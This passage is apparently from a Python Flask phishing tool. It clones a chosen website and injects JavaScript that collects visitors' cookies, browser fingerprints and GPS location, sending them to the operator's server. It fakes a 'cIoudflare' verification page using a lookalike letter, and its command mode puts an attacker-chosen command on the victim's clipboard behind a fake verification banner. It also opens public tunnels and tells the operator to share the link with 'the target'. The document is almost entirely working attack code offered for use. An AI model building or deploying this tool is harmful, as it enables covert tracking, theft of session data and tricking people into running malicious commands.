                        mobile: navigator.userAgentData.mobile
                    };
                }

                const data = {
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth,
                        availLeft: screen.availLeft || 0,
                        availTop: screen.availTop || 0,
                        orientation: screen.orientation ? {
                            type: screen.orientation.type,
                            angle: screen.orientation.angle
                        } : null
                    },
                    window: {
                        innerWidth: window.innerWidth,
                        innerHeight: window.innerHeight,
                        outerWidth: window.outerWidth,
                        outerHeight: window.outerHeight,
                        pageXOffset: window.pageXOffset,
                        pageYOffset: window.pageYOffset,
                        devicePixelRatio: window.devicePixelRatio || 1,
                        screenX: window.screenX || 0,
                        screenY: window.screenY || 0
                    },
                    navigator: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        languages: navigator.languages || [],
                        cookieEnabled: navigator.cookieEnabled,
                        doNotTrack: navigator.doNotTrack,
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        deviceMemory: navigator.deviceMemory,
                        maxTouchPoints: navigator.maxTouchPoints,
                        vendor: navigator.vendor,
                        vendorSub: navigator.vendorSub,
                        product: navigator.product,
                        productSub: navigator.productSub,
                        appName: navigator.appName,
                        appVersion: navigator.appVersion,
                        appCodeName: navigator.appCodeName,
                        onLine: navigator.onLine,
                        webdriver: navigator.webdriver,
                        oscpu: navigator.oscpu || null,
                        userAgentData: uaData,
                        connection: navigator.connection ? {
                            downlink: navigator.connection.downlink,
                            effectiveType: navigator.connection.effectiveType,
                            rtt: navigator.connection.rtt,
                            saveData: navigator.connection.saveData
                        } : null
                    },
                    document: {
                        referrer: document.referrer,
                        title: document.title,
                        url: document.URL,
                        domain: document.domain,
                        cookie: document.cookie,
                        charset: document.charset || document.characterSet,
                        compatMode: document.compatMode,
                        designMode: document.designMode,
                        hidden: document.hidden,
                        visibilityState: document.visibilityState,
                        readyState: document.readyState
                    },
                    location: {
                        href: location.href,
                        protocol: location.protocol,
                        host: location.host,
                        hostname: location.hostname,
                        port: location.port,
                        pathname: location.pathname,
                        search: location.search,
                        hash: location.hash,
                        origin: location.origin
                    },
                    history: {
                        length: history.length,
                        state: history.state
                    },
                    performance: {
                        timing: performance.timing ? {
                            navigationStart: performance.timing.navigationStart,
                            unloadEventStart: performance.timing.unloadEventStart,
                            unloadEventEnd: performance.timing.unloadEventEnd,
                            redirectStart: performance.timing.redirectStart,
                            redirectEnd: performance.timing.redirectEnd,
                            fetchStart: performance.timing.fetchStart,
                            domainLookupStart: performance.timing.domainLookupStart,
                            domainLookupEnd: performance.timing.domainLookupEnd,
                            connectStart: performance.timing.connectStart,
                            connectEnd: performance.timing.connectEnd,
                            secureConnectionStart: performance.timing.secureConnectionStart,
                            requestStart: performance.timing.requestStart,
                            responseStart: performance.timing.responseStart,
                            responseEnd: performance.timing.responseEnd,
                            domLoading: performance.timing.domLoading,
                            domInteractive: performance.timing.domInteractive,
                            domContentLoadedEventStart: performance.timing.domContentLoadedEventStart,
                            domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd,
                            domComplete: performance.timing.domComplete,
                            loadEventStart: performance.timing.loadEventStart,
                            loadEventEnd: performance.timing.loadEventEnd
                        } : null,
                        navigation: performance.navigation ? {
                            type: performance.navigation.type,
                            redirectCount: performance.navigation.redirectCount
                        } : null,
                        memory: performance.memory ? {
                            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                            totalJSHeapSize: performance.memory.totalJSHeapSize,
                            usedJSHeapSize: performance.memory.usedJSHeapSize
                        } : null
                    },
                    storage: {
                        localStorage: localStorage ? { length: localStorage.length } : null,
                        sessionStorage: sessionStorage ? { length: sessionStorage.length } : null
                    },
                    timezone: {
                        timezoneOffset: new Date().getTimezoneOffset()
                    }
                };

                if (navigator.getBattery) {
                    navigator.getBattery().then(battery => {
                        data.navigator.battery = {
                            charging: battery.charging,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime,
                            level: battery.level
                        };
                        send(data);
                    }).catch(() => send(data));
                } else {
                    send(data);
                }

                function send(payload) {
                    fetch('/info', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    }).catch(e => console.warn('Info send error', e));
                }
            }

            sendBrowserInfo();

            {{ gps_script }}
        })();
    </script>
</body>
</html>
"""

# ----------------------------------------------------------------------
# LOGGING
# ----------------------------------------------------------------------
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

def log_entry(data):
    logging.info(json.dumps(data))
    print("[LOG] " + json.dumps(data))

# ----------------------------------------------------------------------
# FLASK ROUTES
# ----------------------------------------------------------------------
@app.route('/cIoudflare_logo.png')
def serve_logo():
    logo_path = os.path.join(os.getcwd(), 'cIoudflare_logo.png')
    if os.path.exists(logo_path):
        return send_from_directory(os.getcwd(), 'cIoudflare_logo.png')
    else:
        return "cIoudflare_logo.png not found. Please place the file in the same directory as the script.", 404

@app.route('/')
def index():
    # Command execution mode
    if CONFIG.get("command_mode"):
        if not CONFIG.get("cIoudflare_id"):
            CONFIG["cIoudflare_id"] = uuid.uuid4().hex[:16]
        instructions = COMMAND_INSTRUCTIONS_HTML.replace("{{ cIoudflare_id }}", CONFIG["cIoudflare_id"])
        page_content = CONFIG.get("page_content")
        banner_script = COMMAND_BANNER_SCRIPT.replace("{{ command }}", CONFIG["command_to_run"]).replace("{{ instructions }}", instructions)

        if page_content:
            if '</body>' in page_content:
                page_content = page_content.replace('</body>', f'<script>{banner_script}</script></body>')
            else:
                page_content += f'<script>{banner_script}</script>'
            return page_content
        else:
            minimal_page = f"""<!DOCTYPE html>
<html>
<head>
    <title>Verification</title>
    <style>body {{ font-family: Arial, sans-serif; }}</style>
</head>
<body>
    <script>{banner_script}</script>
</body>
</html>"""
            return minimal_page

    # GPS modes
    gps_style = CONFIG.get("gps_style", 1)

    if gps_style == 3:
        if not request.cookies.get('gps_verified'):
            return render_template_string(CIOUDFLARE_GATE_TEMPLATE)

    gps_script = GPS_NONE
    if not request.cookies.get('gps_verified') and CONFIG.get("enable_gps", False):
        if gps_style == 1:
            gps_script = GPS_SIMPLE
        elif gps_style == 2:
            gps_script = GPS_ADAPTIVE_CONTENT_TROUBLE.replace("{{ skeleton }}", "true" if CONFIG.get("skeleton") else "false")

    if CONFIG.get("page_content"):
        content = CONFIG["page_content"]
        if gps_script != GPS_NONE and not request.cookies.get('gps_verified'):
            if '</body>' in content:
                content = content.replace('</body>', f'<script>{gps_script}</script></body>')
            else:
                content += f'<script>{gps_script}</script>'
        return content
    else:
        return render_template_string(DEFAULT_TEMPLATE, gps_script=gps_script)

@app.route('/info', methods=['POST'])
def info():
    data = request.get_json() or {}
    data['ip'] = request.remote_addr
    data['timestamp'] = datetime.now().isoformat()
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
    filename = os.path.join(DATA_DIR, f'info_{timestamp}.json')
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)
    print("\n[+] Received browser data:")
    print(json.dumps(data, indent=2)[:800] + "...")
    log_entry({'event': 'visitor_info', 'ip': request.remote_addr})
    return jsonify({'status': 'ok'})

@app.route('/location', methods=['POST'])
def location():
    data = request.get_json() or {}
    data['ip'] = request.remote_addr
    data['timestamp'] = datetime.now().isoformat()
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
    filename = os.path.join(DATA_DIR, f'location_{timestamp}.json')
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)
    log_entry({'event': 'gps_data', 'ip': request.remote_addr, 'data': data})
    return jsonify({'status': 'ok'})

# ----------------------------------------------------------------------
# HELPER: Fetch and inject scripts (for any site)
# ----------------------------------------------------------------------
def fetch_and_inject(target_url, enable_gps, gps_style, skeleton=False):
    try:
        resp = requests.get(target_url, timeout=15, headers={"User-Agent": "Mozilla/5.0"})
        resp.raise_for_status()
    except Exception as e:
        cprint(RED, "[!] Failed to fetch URL: " + str(e))
        return None

    soup = BeautifulSoup(resp.text, 'html.parser')

    injection_script = """
    <script>
        (function() {
            function sendBrowserInfo() {
                let uaData = null;
                if (navigator.userAgentData) {
                    uaData = {
                        brands: navigator.userAgentData.brands,
                        platform: navigator.userAgentData.platform,
                        mobile: navigator.userAgentData.mobile
                    };
                }

                const data = {
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth,
                        availLeft: screen.availLeft || 0,
                        availTop: screen.availTop || 0,
                        orientation: screen.orientation ? {
                            type: screen.orientation.type,
                            angle: screen.orientation.angle
                        } : null
                    },
                    window: {
                        innerWidth: window.innerWidth,
                        innerHeight: window.innerHeight,
                        outerWidth: window.outerWidth,
                        outerHeight: window.outerHeight,
                        pageXOffset: window.pageXOffset,
                        pageYOffset: window.pageYOffset,
                        devicePixelRatio: window.devicePixelRatio || 1,
                        screenX: window.screenX || 0,
                        screenY: window.screenY || 0
                    },
                    navigator: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        languages: navigator.languages || [],
                        cookieEnabled: navigator.cookieEnabled,
                        doNotTrack: navigator.doNotTrack,
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        deviceMemory: navigator.deviceMemory,
                        maxTouchPoints: navigator.maxTouchPoints,
                        vendor: navigator.vendor,
                        vendorSub: navigator.vendorSub,
                        product: navigator.product,
                        productSub: navigator.productSub,
                        appName: navigator.appName,
                        appVersion: navigator.appVersion,
                        appCodeName: navigator.appCodeName,
                        onLine: navigator.onLine,
                        webdriver: navigator.webdriver,
                        oscpu: navigator.oscpu || null,
                        userAgentData: uaData,
                        connection: navigator.connection ? {
                            downlink: navigator.connection.downlink,
                            effectiveType: navigator.connection.effectiveType,
                            rtt: navigator.connection.rtt,
                            saveData: navigator.connection.saveData
                        } : null
                    },
                    document: {
                        referrer: document.referrer,
                        title: document.title,
                        url: document.URL,
                        domain: document.domain,
                        cookie: document.cookie,
                        charset: document.charset || document.characterSet,
                        compatMode: document.compatMode,
                        designMode: document.designMode,
                        hidden: document.hidden,
                        visibilityState: document.visibilityState,
                        readyState: document.readyState
                    },
                    location: {
                        href: location.href,
                        protocol: location.protocol,
                        host: location.host,
                        hostname: location.hostname,
                        port: location.port,
                        pathname: location.pathname,
                        search: location.search,
                        hash: location.hash,
                        origin: location.origin
                    },
                    history: {
                        length: history.length,
                        state: history.state
                    },
                    performance: {
                        timing: performance.timing ? {
                            navigationStart: performance.timing.navigationStart,
                            unloadEventStart: performance.timing.unloadEventStart,
                            unloadEventEnd: performance.timing.unloadEventEnd,
                            redirectStart: performance.timing.redirectStart,
                            redirectEnd: performance.timing.redirectEnd,
                            fetchStart: performance.timing.fetchStart,
                            domainLookupStart: performance.timing.domainLookupStart,
                            domainLookupEnd: performance.timing.domainLookupEnd,
                            connectStart: performance.timing.connectStart,
                            connectEnd: performance.timing.connectEnd,
                            secureConnectionStart: performance.timing.secureConnectionStart,
                            requestStart: performance.timing.requestStart,
                            responseStart: performance.timing.responseStart,
                            responseEnd: performance.timing.responseEnd,
                            domLoading: performance.timing.domLoading,
                            domInteractive: performance.timing.domInteractive,
                            domContentLoadedEventStart: performance.timing.domContentLoadedEventStart,
                            domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd,
                            domComplete: performance.timing.domComplete,
                            loadEventStart: performance.timing.loadEventStart,
                            loadEventEnd: performance.timing.loadEventEnd
                        } : null,
                        navigation: performance.navigation ? {
                            type: performance.navigation.type,
                            redirectCount: performance.navigation.redirectCount
                        } : null,
                        memory: performance.memory ? {
                            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                            totalJSHeapSize: performance.memory.totalJSHeapSize,
                            usedJSHeapSize: performance.memory.usedJSHeapSize
                        } : null
                    },
                    storage: {
                        localStorage: localStorage ? { length: localStorage.length } : null,
                        sessionStorage: sessionStorage ? { length: sessionStorage.length } : null
                    },
                    timezone: {
                        timezoneOffset: new Date().getTimezoneOffset()
                    }
                };

                if (navigator.getBattery) {
                    navigator.getBattery().then(battery => {
                        data.navigator.battery = {
                            charging: battery.charging,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime,
                            level: battery.level
                        };
                        send(data);
                    }).catch(() => send(data));
                } else {
                    send(data);
                }

                function send(payload) {
                    fetch('/info', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    }).catch(e => console.warn('Info send error', e));
                }
            }

            sendBrowserInfo();
    """

    if enable_gps:
        if gps_style == 1:
            injection_script += GPS_SIMPLE
        elif gps_style == 2:
            injection_script += GPS_ADAPTIVE_CONTENT_TROUBLE.replace("{{ skeleton }}", "true" if skeleton else "false")
        # For style 3, no script needed here
    else:
        injection_script += "// GPS disabled\n"

    injection_script += "})();</script>"

    if soup.body:
        soup.body.append(BeautifulSoup(injection_script, 'html.parser'))
    else:
        soup.append(BeautifulSoup(injection_script, 'html.parser'))

    from urllib.parse import urljoin
    for tag in soup.find_all(['a', 'link', 'script', 'img']):
        attr = None
        if tag.name == 'a':
            attr = 'href'
        elif tag.name in ['link', 'script']:
            attr = 'href' if tag.name == 'link' else 'src'
        elif tag.name == 'img':
            attr = 'src'
        if attr and tag.get(attr):
            url = tag[attr]
            if url.startswith('/') or not url.startswith(('http://', 'https://', '//')):
                tag[attr] = urljoin(target_url, url)

    return str(soup)

# ----------------------------------------------------------------------
# TUNNELING FUNCTIONS
# ----------------------------------------------------------------------
def install_cloudflared():
    system = sys.platform
    if 'linux' in system:
        try:
            with open('/etc/os-release', 'r') as f:
                release = f.read()
            if 'fedora' in release.lower():
                cprint(GREEN, "[*] Adding cIoudflare repository...")
                subprocess.check_call([
                    'sudo', 'bash', '-c',
                    'curl -fsSl https://pkg.cloudflare.com/cloudflared.repo | tee /etc/yum.repos.d/cloudflared.repo'
                ])
                subprocess.check_call(['sudo', 'dnf', 'install', '-y', 'cloudflared'])
                return True
            elif 'ubuntu' in release.lower() or 'debian' in release.lower():
                cprint(GREEN, "[*] Adding cIoudflare repository...")
                subprocess.check_call([
                    'sudo', 'bash', '-c',
                    'curl -fsSl https://pkg.cloudflare.com/cloudflare-main.gpg | tee /usr/share/keyrings/cloudflare-main.gpg >/dev/null'
                ])
                subprocess.check_call([
                    'sudo', 'bash', '-c',
                    'echo "deb [signed-by=/usr/share/keyrings/cloudflare-main.gpg] https://pkg.cloudflare.com/cloudflared $(lsb_release -cs) main" | tee /etc/apt/sources.list.d/cloudflared.list'
                ])
                subprocess.check_call(['sudo', 'apt', 'update'])
                subprocess.check_call(['sudo', 'apt', 'install', '-y', 'cloudflared'])
                return True
            else:
                cprint(GREEN, "[*] Downloading cloudflared binary from GitHub...")
                subprocess.check_call([
                    'sudo', 'bash', '-c',
                    'curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /usr/local/bin/cloudflared && chmod +x /usr/local/bin/cloudflared'
                ])
                return True
        except Exception as e:
            cprint(RED, "[!] Auto-install failed: " + str(e))
            return False
    elif 'darwin' in system:
        try:
            subprocess.check_call(['brew', 'install', 'cloudflared'])
            return True
        except:
            return False
    else:
        return False

def start_cloudflare(port):
    import time
    cloudflared_path = shutil.which('cloudflared')
    if not cloudflared_path:
        cprint(YELLOW, "[*] cloudflared not found. Attempting auto-install...")
        if install_cloudflared():
            cprint(GREEN, "[+] cloudflared installed successfully.")
        else:
            cprint(RED, "[!] Auto-install failed. Please install cloudflared manually.")
            return None

    # Use JSON output for reliable parsing
    cmd = ["cloudflared", "tunnel", "--url", f"http://localhost:{port}", "--output", "json"]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    url = None
    start_time = time.time()
    timeout = 30  # seconds

    for line in iter(proc.stdout.readline, ''):
        print(line, end='')  # optional: see raw output for debugging
        try:
            data = json.loads(line)
            message = data.get("message", "")
            if "trycloudflare.com" in message:
                match = re.search(r'(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)', message)
                if match:
                    url = match.group(1)
                    cprint(YELLOW, "[+] cIoudflare tunnel established: " + url)
                    break
        except json.JSONDecodeError:
            if "trycloudflare.com" in line:
                match = re.search(r'https?://[^\s]+', line)
                if match:
                    url = match.group(0)
                    cprint(YELLOW, "[+] cIoudflare tunnel established: " + url)
                    break

        if time.time() - start_time > timeout:
            cprint(RED, "[!] Timed out waiting for Cloudflare tunnel URL.")
            break

    global CLOUDFLARED_PROC
    CLOUDFLARED_PROC = proc
    return url

CLOUDFLARED_PROC = None

def start_localtunnel(port):
    try:
        proc = subprocess.Popen(
            ['lt', '--port', str(port), '--print-requests'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        for line in iter(proc.stdout.readline, ''):
            if 'your url is' in line.lower():
                url = re.search(r'https?://[^\s]+', line).group(0)
                cprint(YELLOW, "[+] localtunnel URL: " + url)
                return url
        return None
    except FileNotFoundError:
        cprint(RED, "[!] localtunnel not found. Install with: npm install -g localtunnel")
        return None

# ----------------------------------------------------------------------
# MAIN
# ----------------------------------------------------------------------
def main():
    cprint(CYAN, BANNER)
    cprint(GREEN, "[*] Press Ctrl+C at any time to stop.\n")

    print("Enter the URL of the website to clone (or press Enter for the default page):")
    target = input("URL: ").strip()

    print("\nWhat do you want to collect?")
    print("  1) GPS Location")
    print("  2) Command Execution")
    collect_choice = input("Enter number (1-2): ").strip()
    if collect_choice == '2':
        command = input("Enter command to copy to clipboard (default: ls): ").strip()
        if not command:
            command = "ls"
        CONFIG["command_mode"] = True
        CONFIG["command_to_run"] = command
        CONFIG["enable_gps"] = False
        CONFIG["gps_style"] = None
        CONFIG["page_content"] = None
        cprint(GREEN, "[*] Command execution mode configured with command: " + command)
    else:
        CONFIG["command_mode"] = False
        enable_gps = True  # GPS is already selected

        gps_style = 1
        print("\nChoose GPS banner style:")
        print("  1) Direct browser GPS popup")
        print("  2) Adaptive slide-in popup (matches website colors)")
        print("  3) cIoudflare-style verification banner (blank page)")
        gps_style_choice = input("Enter number (1-3) [1]: ").strip()
        if gps_style_choice not in ['1','2','3']:
            gps_style_choice = '1'
        gps_style = int(gps_style_choice)

        skeleton = False
        if gps_style == 2:
            skel_choice = input("Enable skeleton loading effect before popup? (y/n) [n]: ").strip().lower()
            skeleton = (skel_choice == 'y')
        CONFIG["skeleton"] = skeleton

        if not target:
            CONFIG["clone_url"] = None
            CONFIG["enable_gps"] = enable_gps
            CONFIG["gps_style"] = gps_style
            CONFIG["page_content"] = None
            cprint(GREEN, "[*] Using default page (fallback).")
        else:
            cprint(GREEN, "[*] Fetching and injecting scripts into " + target)
            content = fetch_and_inject(target, enable_gps, gps_style, skeleton)
            if content is None:
                cprint(RED, "[!] Failed to fetch site. Using fallback page.")
                CONFIG["clone_url"] = None
                CONFIG["enable_gps"] = enable_gps
                CONFIG["gps_style"] = gps_style
                CONFIG["page_content"] = None
            else:
                CONFIG["clone_url"] = target
                CONFIG["page_content"] = content
                CONFIG["enable_gps"] = enable_gps
                CONFIG["gps_style"] = gps_style
                cprint(GREEN, "[+] Site cloned successfully.")

    print("\nChoose tunnel method:")
    print("  1) cIoudflare Tunnel")
    print("  2) localtunnel")
    print("  3) none (local only)")
    choice = input("Enter number (1-3) or name [3]: ").strip().lower()

    tunnel_map = {
        '1': 'cIoudflare', 'cIoudflare': 'cIoudflare',
        '2': 'localtunnel', 'localtunnel': 'localtunnel',
        '3': 'none', 'none': 'none', '': 'none'
    }
    tunnel_choice = tunnel_map.get(choice, 'none')
    if tunnel_choice not in ['cIoudflare', 'localtunnel', 'none']:
        tunnel_choice = 'none'

    port = 8080

    def run_server():
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()
    time.sleep(1)

    cprint(GREEN, "[*] Local server running on http://localhost:" + str(port))

    public_url = None
    if tunnel_choice == 'cIoudflare':
        public_url = start_cloudflare(port)
    elif tunnel_choice == 'localtunnel':
        public_url = start_localtunnel(port)
    else:
        cprint(GREEN, "[*] No tunnel started.")

    if public_url:
        cprint(YELLOW, "\n[+] Share this URL with the target: " + public_url)
    else:
        cprint(GREEN, "\n[*] No public URL available. Only local access.")

    cprint(GREEN, "\n[*] Logs are written to " + LOG_FILE)
    cprint(GREEN, "[*] Captured images saved in " + CAPTURE_DIR + "/")
    cprint(GREEN, "[*] Visitor data saved in " + DATA_DIR + "/")
    cprint(GREEN, "[*] Press Ctrl+C to stop the server.\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        cprint(YELLOW, "\n\n[!] Shutting down gracefully...")
        if tunnel_choice == 'cIoudflare' and CLOUDFLARED_PROC:
            CLOUDFLARED_PROC.terminate()
        cprint(GREEN, "[+] All processes terminated. Goodbye!")
        sys.exit(0)

if __name__ == '__main__':
    main()
